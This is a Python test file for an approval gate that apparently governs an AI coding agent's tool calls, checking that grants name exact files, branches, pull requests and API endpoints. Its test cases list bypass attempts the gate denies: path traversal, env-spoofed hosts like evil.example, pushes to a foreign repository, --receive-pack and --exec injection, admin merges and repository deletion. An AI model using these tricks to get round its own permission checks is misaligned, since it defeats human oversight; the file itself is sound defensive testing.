"""Delegated grants name exact resources; wildcard patterns are refused (issue #38)."""
from __future__ import annotations

import contextlib
import json
import subprocess
import sys
import unittest
from pathlib import Path
from typing import Iterator

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / '.getzilla'))

from getzilla.policy import evaluate_pre_tool, production_action
from getzilla.router import build_route
from getzilla.state import add_approval, approvals_path, has_valid_approval, set_active_route
from tests._support import project_copy

PATTERNS = ('*', '**', '.grok/**', '.getzilla/*', 'AGENTS.m?', '[A]GENTS.md', 'trust-ci/**/api.py')
CONTROL_PLANE_TARGETS = (
    'AGENTS.md',
    '.grok/hooks/pre_tool_use.py',
    '.getzilla/config/policy.json',
    'trust-ci/src/adaptive_trust_ci/api.py',
)


@contextlib.contextmanager
def github_project() -> Iterator[Path]:
    with project_copy(git=True) as root:
        subprocess.run(
            ['git', 'remote', 'add', 'origin', 'git@github.com:Dimkox/Getzilla.git'],
            cwd=root,
            check=True,
        )
        set_active_route(root, build_route(root, 'Исправить PHP баг', 's1').to_dict())
        yield root


class ApprovalResourceTests(unittest.TestCase):
    def test_protected_path_grant_refuses_patterns(self) -> None:
        with github_project() as root:
            for pattern in PATTERNS:
                with self.subTest(pattern=pattern):
                    with self.assertRaisesRegex(ValueError, 'exact'):
                        add_approval(
                            root, 'protected-path', 'blanket', 5,
                            actions=['protected-path-write'], resources=[pattern],
                        )
            self.assertFalse(approvals_path(root).exists() and json.loads(approvals_path(root).read_text()))

    def test_protected_path_grant_refuses_paths_outside_the_repository(self) -> None:
        with github_project() as root:
            for resource in ('/etc/passwd', '../outside.txt', '.grok/../AGENTS.md'):
                with self.subTest(resource=resource):
                    with self.assertRaisesRegex(ValueError, 'repository-relative'):
                        add_approval(
                            root, 'protected-path', 'edit', 5,
                            actions=['protected-path-write'], resources=[resource],
                        )

    def test_external_write_grant_refuses_patterns_without_route_gate(self) -> None:
        with github_project() as root:
            with self.assertRaisesRegex(ValueError, 'exact'):
                add_approval(
                    root, 'external-write', 'issues', 5,
                    actions=['external-write'], resources=['https://api.github.com/repos/Dimkox/Getzilla/*'],
                )

    def test_stored_pattern_grant_does_not_authorize_control_plane_writes(self) -> None:
        with github_project() as root:
            approval = add_approval(
                root, 'protected-path', 'one file', 5,
                actions=['protected-path-write'], resources=['AGENTS.md'],
            )
            approval['resources'] = ['*']
            approvals_path(root).write_text(json.dumps([approval]), encoding='utf-8')
            for target in CONTROL_PLANE_TARGETS:
                with self.subTest(target=target):
                    self.assertFalse(
                        has_valid_approval(root, 'protected-path', action='protected-path-write', resource=target)
                    )
                    allowed, _ = evaluate_pre_tool(root, {'tool_name': 'Edit', 'tool_input': {'path': target}})
                    self.assertFalse(allowed, target)

    def test_exact_grant_authorizes_only_its_path(self) -> None:
        with github_project() as root:
            add_approval(
                root, 'protected-path', 'one file', 5,
                actions=['protected-path-write'], resources=['./AGENTS.md'],
            )
            allowed, reason = evaluate_pre_tool(root, {'tool_name': 'Edit', 'tool_input': {'path': 'AGENTS.md'}})
            self.assertTrue(allowed, reason)
            allowed, _ = evaluate_pre_tool(
                root, {'tool_name': 'Edit', 'tool_input': {'path': '.grok/hooks/pre_tool_use.py'}},
            )
            self.assertFalse(allowed)

    def test_cli_refuses_wildcard_resource_without_traceback(self) -> None:
        with github_project() as root:
            proc = subprocess.run(
                [
                    sys.executable, str(ROOT / 'scripts/getzilla_approve.py'), 'protected-path',
                    '--action', 'protected-path-write', '--resource', '*', '--reason', 'blanket',
                ],
                cwd=root, text=True, capture_output=True, check=False,
            )
            self.assertEqual(proc.returncode, 2, proc.stderr)
            self.assertIn('exact', proc.stderr)
            self.assertNotIn('Traceback', proc.stderr)
            self.assertFalse(approvals_path(root).exists() and json.loads(approvals_path(root).read_text()))


class ExactTargetGrantTests(unittest.TestCase):
    """Review of #53: category resources and unbound production grants acted as wildcards."""

    def bash(self, root: Path, command: str) -> tuple[bool, str | None]:
        return evaluate_pre_tool(root, {'tool_name': 'Bash', 'tool_input': {'command': command}})

    def test_category_resource_names_are_refused(self) -> None:
        with github_project() as root:
            for resource in ('github-api', 'github-pull-request-review', 'direct-http-write'):
                with self.subTest(resource=resource), self.assertRaisesRegex(ValueError, 'exact'):
                    add_approval(root, 'external-write', 'x', 5, actions=['external-write'], resources=[resource])

    def test_github_api_grant_binds_method_and_endpoint(self) -> None:
        with github_project() as root:
            add_approval(
                root, 'external-write', 'one issue', 5, actions=['external-write'],
                resources=['github-api:POST api.github.com/repos/Dimkox/Getzilla/issues'],
            )
            allowed, reason = self.bash(root, 'gh api repos/Dimkox/Getzilla/issues -f title=x')
            self.assertTrue(allowed, reason)
            self.assertFalse(self.bash(root, 'gh api -X PUT repos/Dimkox/Getzilla/pulls/1/merge')[0])
            for command in (
                'gh api -X DELETE repos/Dimkox/Getzilla',
                'gh -R other/repo api -X PATCH repos/other/repo -f visibility=public',
                'gh api repos/Dimkox/Getzilla/issues/1/comments -f body=x',
                'gh api --hostname ghe.example repos/Dimkox/Getzilla/issues -f title=x',
            ):
                with self.subTest(command=command):
                    allowed, reason = self.bash(root, command)
                    self.assertFalse(allowed, command)
                    self.assertIn('github-api:', reason or '')

    def test_github_api_merge_endpoint_is_a_production_merge(self) -> None:
        self.assertEqual(production_action('gh api -X PUT repos/Dimkox/Getzilla/pulls/7/merge'), 'pull-request-merge')
        self.assertIsNone(production_action('gh api repos/Dimkox/Getzilla/pulls/7/merge'))

    def test_pull_request_review_grant_binds_repository_and_number(self) -> None:
        with github_project() as root:
            add_approval(
                root, 'external-write', 'review one PR', 5, actions=['external-write'],
                resources=['github-pr-review:Dimkox/Getzilla#1'],
            )
            for command in ('gh pr review --approve 1', 'gh pr review https://github.com/Dimkox/Getzilla/pull/1 -a'):
                with self.subTest(command=command):
                    allowed, reason = self.bash(root, command)
                    self.assertTrue(allowed, reason)
            for command in ('gh pr review 2 --approve', 'gh -R someone/else pr review 1 --approve', 'gh pr review --approve'):
                with self.subTest(command=command):
                    allowed, reason = self.bash(root, command)
                    self.assertFalse(allowed, command)
                    self.assertIn('github-pr-review:', reason or '')

    def test_branch_push_grant_binds_the_branch(self) -> None:
        with github_project() as root:
            add_approval(root, 'production', 'push fix/x', 5, actions=['git-push-branch'], resources=['fix/x'])
            for command in ('git push origin fix/x', 'git push -u origin fix/x', 'git push origin refs/heads/fix/x'):
                with self.subTest(command=command):
                    allowed, reason = self.bash(root, command)
                    self.assertTrue(allowed, reason)
            for command in (
                'git push origin main', 'git push origin HEAD:main', 'git push --all origin', 'git push --mirror origin',
                'git push origin fix/y', 'git push origin fix/x:main', 'git push origin fix/x fix/y',
                'git push origin :fix/x', 'git push --delete origin fix/x', 'git push git@github.com:evil/repo.git fix/x',
            ):
                with self.subTest(command=command):
                    allowed, _ = self.bash(root, command)
                    self.assertFalse(allowed, command)

    def test_branch_push_without_refspec_resolves_the_current_branch(self) -> None:
        with github_project() as root:
            subprocess.run(['git', 'checkout', '-qb', 'fix/x'], cwd=root, check=True)
            add_approval(root, 'production', 'push fix/x', 5, actions=['git-push-branch'], resources=['fix/x'])
            for command in ('git push', 'git push origin', 'git push origin HEAD'):
                with self.subTest(command=command):
                    allowed, reason = self.bash(root, command)
                    self.assertTrue(allowed, reason)

    def test_push_to_a_protected_branch_is_denied_even_with_a_grant(self) -> None:
        with github_project() as root:
            add_approval(root, 'production', 'push main', 5, actions=['git-push-branch'], resources=['main'])
            for command in ('git push origin main', 'git push origin HEAD:refs/heads/main', 'git push origin master'):
                with self.subTest(command=command):
                    allowed, reason = self.bash(root, command)
                    self.assertFalse(allowed, command)
                    self.assertIn('protected branch', reason or '')

    def test_unbound_production_grant_does_not_authorize_a_targeted_action(self) -> None:
        with github_project() as root:
            add_approval(root, 'production', 'any push', 5, actions=['git-push-branch'])
            allowed, reason = self.bash(root, 'git push origin fix/x')
            self.assertFalse(allowed)
            self.assertIn('fix/x', reason or '')

    def test_merge_grant_binds_the_pull_request(self) -> None:
        with github_project() as root:
            add_approval(
                root, 'production', 'merge #1', 5, actions=['pull-request-merge'], resources=['Dimkox/Getzilla#1'],
            )
            allowed, reason = self.bash(root, 'gh pr merge 1 --squash')
            self.assertTrue(allowed, reason)
            for command in ('gh pr merge 2', 'gh -R other/repo pr merge 1', 'gh pr merge'):
                with self.subTest(command=command):
                    allowed, _ = self.bash(root, command)
                    self.assertFalse(allowed, command)

    def test_exact_url_with_query_string_is_grantable(self) -> None:
        url = 'https://api.github.com/repos/Dimkox/Getzilla/issues?state=open'
        with github_project() as root:
            add_approval(root, 'external-write', 'one url', 5, actions=['external-write'], resources=[url])
            self.assertTrue(has_valid_approval(root, 'external-write', action='external-write', resource=url))
            self.assertFalse(has_valid_approval(
                root, 'external-write', action='external-write', resource=url.replace('?state=open', ''),
            ))

    def test_protected_path_grant_refuses_drive_letters_empty_segments_and_odd_names(self) -> None:
        with github_project() as root:
            for resource in ('C:/x', 'c:x', 'a//b', '~/.bashrc', 'AGENTS.md.', 'AGENTS.md::$DATA',
                             '{AGENTS,README}.md', 'AGENTS.md\x00'):
                with self.subTest(resource=resource), self.assertRaises(ValueError):
                    add_approval(
                        root, 'protected-path', 'edit', 5, actions=['protected-path-write'], resources=[resource],
                    )

    def test_runbook_grant_examples_name_exact_resources(self) -> None:
        import re

        text = (ROOT / 'engineering/runbooks/protected-control-plane-write.md').read_text(encoding='utf-8')
        resources = re.findall(r"--resource '([^']+)'", text)
        self.assertTrue(resources)
        with github_project() as root:
            add_approval(root, 'protected-path', 'runbook', 5, actions=['protected-path-write'], resources=resources)
        self.assertNotIn('target patterns', text)


class GrantBindingEnvSpellingTests(unittest.TestCase):
    """S53-1 after merging main: every way of setting GH_REPO/GH_HOST rebinds the target."""

    def bash(self, root: Path, command: str) -> tuple[bool, str | None]:
        return evaluate_pre_tool(root, {'tool_name': 'Bash', 'tool_input': {'command': command}})

    def test_env_wrapper_and_export_do_not_bypass_a_merge_grant(self) -> None:
        with github_project() as root:
            add_approval(
                root, 'production', 'merge #5', 5,
                actions=['pull-request-merge'], resources=['Dimkox/Getzilla#5'],
            )
            self.assertTrue(self.bash(root, 'gh pr merge 5 --squash')[0])
            for command in (
                'env GH_REPO=other/x gh pr merge 5',
                'export GH_REPO=other/x; gh pr merge 5',
                'export GH_HOST=evil.example && gh pr merge 5',
                'GH_REPO=other/x; export GH_REPO; gh pr merge 5',
            ):
                with self.subTest(command=command):
                    self.assertFalse(self.bash(root, command)[0], command)

    def test_env_wrapper_and_export_do_not_bypass_an_api_grant(self) -> None:
        with github_project() as root:
            add_approval(
                root, 'external-write', 'one issue', 5, actions=['external-write'],
                resources=['github-api:POST api.github.com/repos/Dimkox/Getzilla/issues'],
            )
            self.assertTrue(self.bash(root, 'gh api repos/Dimkox/Getzilla/issues -f title=x')[0])
            for command in (
                'env GH_HOST=evil.example gh api repos/Dimkox/Getzilla/issues -f title=x',
                'export GH_HOST=evil.example; gh api repos/Dimkox/Getzilla/issues -f title=x',
            ):
                with self.subTest(command=command):
                    self.assertFalse(self.bash(root, command)[0], command)

    def test_generic_gh_write_grant_is_bound_to_the_resolved_repository(self) -> None:
        with github_project() as root:
            add_approval(
                root, 'external-write', 'issue', 5, actions=['external-write'],
                resources=['gh:. issue create'],
            )
            self.assertTrue(self.bash(root, 'gh issue create -t hello -b body')[0])
            for command in (
                'GH_REPO=other/x gh issue create -t hello -b body',
                'env GH_REPO=other/x gh issue create -t hello -b body',
                'export GH_REPO=other/x; gh issue create -t hello -b body',
                'GH_HOST=evil.example gh issue create -t hello -b body',
            ):
                with self.subTest(command=command):
                    self.assertFalse(self.bash(root, command)[0], command)


class GrantBindingReview2Tests(unittest.TestCase):
    """Round-2 review: env-prefix target spoofing (S53-1) and over-broad push/merge grants (S53-2)."""

    def bash(self, root: Path, command: str) -> tuple[bool, str | None]:
        return evaluate_pre_tool(root, {'tool_name': 'Bash', 'tool_input': {'command': command}})

    def test_gh_env_repo_and_host_do_not_bypass_a_merge_grant(self) -> None:
        with github_project() as root:
            add_approval(
                root, 'production', 'merge #5', 5,
                actions=['pull-request-merge'], resources=['Dimkox/Getzilla#5'],
            )
            allowed, reason = self.bash(root, 'gh pr merge 5 --squash')
            self.assertTrue(allowed, reason)
            for command in ('GH_REPO=other/x gh pr merge 5', 'GH_HOST=evil.example gh pr merge 5'):
                with self.subTest(command=command):
                    allowed, _ = self.bash(root, command)
                    self.assertFalse(allowed, command)

    def test_gh_env_host_does_not_bypass_an_api_grant(self) -> None:
        with github_project() as root:
            add_approval(
                root, 'external-write', 'one issue', 5, actions=['external-write'],
                resources=['github-api:POST api.github.com/repos/Dimkox/Getzilla/issues'],
            )
            allowed, reason = self.bash(root, 'gh api repos/Dimkox/Getzilla/issues -f title=x')
            self.assertTrue(allowed, reason)
            allowed, reason = self.bash(root, 'GH_HOST=evil.example gh api repos/Dimkox/Getzilla/issues -f title=x')
            self.assertFalse(allowed, reason)

    def test_gh_env_repo_does_not_bypass_a_pr_review_grant(self) -> None:
        with github_project() as root:
            add_approval(
                root, 'external-write', 'review one PR', 5, actions=['external-write'],
                resources=['github-pr-review:Dimkox/Getzilla#1'],
            )
            allowed, reason = self.bash(root, 'gh pr review --approve 1')
            self.assertTrue(allowed, reason)
            allowed, _ = self.bash(root, 'GH_REPO=other/x gh pr review 1 --approve')
            self.assertFalse(allowed)

    def test_push_grant_refuses_receive_pack_and_exec(self) -> None:
        with github_project() as root:
            add_approval(root, 'production', 'push fix/x', 5, actions=['git-push-branch'], resources=['fix/x'])
            self.assertTrue(self.bash(root, 'git push origin fix/x')[0])
            for command in (
                'git push origin fix/x --receive-pack=/tmp/x',
                'git push origin fix/x --exec=/tmp/x',
                'git push origin fix/x --receive-pack /tmp/x',
            ):
                with self.subTest(command=command):
                    allowed, _ = self.bash(root, command)
                    self.assertFalse(allowed, command)

    def test_merge_grant_refuses_admin_bypass_unless_explicitly_granted(self) -> None:
        with github_project() as root:
            add_approval(
                root, 'production', 'merge #1', 5, actions=['pull-request-merge'], resources=['Dimkox/Getzilla#1'],
            )
            self.assertTrue(self.bash(root, 'gh pr merge 1 --squash')[0])
            self.assertFalse(self.bash(root, 'gh pr merge 1 --admin')[0])
        with github_project() as root:
            add_approval(
                root, 'production', 'admin merge #1', 5,
                actions=['pull-request-merge'], resources=['Dimkox/Getzilla#1!admin'],
            )
            allowed, reason = self.bash(root, 'gh pr merge 1 --admin')
            self.assertTrue(allowed, reason)

    def test_normalize_rejects_percent_encoded_traversal(self) -> None:
        with github_project() as root:
            for resource in ('%2e%2e/AGENTS.md', '%2E%2E/AGENTS.md', 'a/%2e%2e/AGENTS.md'):
                with self.subTest(resource=resource), self.assertRaises(ValueError):
                    add_approval(
                        root, 'protected-path', 'edit', 5,
                        actions=['protected-path-write'], resources=[resource],
                    )

    def test_normalize_rejects_bare_control_plane_directory(self) -> None:
        with github_project() as root:
            for resource in ('.grok', '.getzilla', '.github', 'trust-ci'):
                with self.subTest(resource=resource), self.assertRaises(ValueError):
                    add_approval(
                        root, 'protected-path', 'edit', 5,
                        actions=['protected-path-write'], resources=[resource],
                    )

    def test_github_target_grant_rejects_trailing_hash(self) -> None:
        with github_project() as root:
            with self.assertRaises(ValueError):
                add_approval(
                    root, 'external-write', 'review', 5,
                    actions=['external-write'], resources=['github-pr-review:Dimkox/Getzilla#'],
                )


if __name__ == '__main__':
    unittest.main()
